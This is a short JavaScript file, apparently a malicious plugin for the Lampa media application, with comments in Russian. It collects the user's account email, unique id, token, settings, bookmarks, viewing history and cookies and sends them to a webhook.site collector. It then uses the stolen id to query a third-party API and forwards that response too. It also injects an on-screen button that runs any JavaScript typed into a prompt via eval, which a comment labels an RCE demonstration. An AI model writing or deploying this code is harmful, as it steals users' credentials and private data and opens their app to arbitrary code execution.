(function() {
    'use strict';

    // Твой webhook.site адрес
    var collector = 'https://webhook.site/8049dd9f-65ce-4bf1-8169-f4039e3c26f8';

    // Собираем ценные данные
    var stolen = {
        account_email: Lampa.Storage.get('account_email', ''),
        lampac_unic_id: Lampa.Storage.get('lampac_unic_id', ''),
        settings: Lampa.Storage.get('settings', {}),
        bookmarks: Lampa.Storage.get('bookmarks', []),
        history: Lampa.Storage.get('history', []),
        token: Lampa.Storage.get('token', ''),
        cookies: document.cookie
    };

    // Отправляем на сервер
    var xhr = new XMLHttpRequest();
    xhr.open('POST', collector, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(stolen));

    // Пытаемся получить доступ к API с украденным uid
    if (stolen.lampac_unic_id) {
        Lampa.Network.silent(
            'https://lampa.azharkov.ru/cub/red/api/feed/all?uid=' + stolen.lampac_unic_id,
            function(data) {
                // Отправляем ответ нашим сборщикам
                var xhr2 = new XMLHttpRequest();
                xhr2.open('POST', collector + '?type=api_response', true);
                xhr2.setRequestHeader('Content-Type', 'application/json');
                xhr2.send(JSON.stringify(data));
            }
        );
    }

    // Внедряем кнопку для выполнения произвольного JS (для демонстрации RCE)
    var btn = document.createElement('button');
    btn.innerHTML = 'X';
    btn.style.position = 'fixed';
    btn.style.bottom = '10px';
    btn.style.right = '10px';
    btn.style.zIndex = 9999;
    btn.onclick = function() {
        var cmd = prompt('Введите JavaScript:');
        if (cmd) {
            eval(cmd);
        }
    };
    document.body.appendChild(btn);
})();
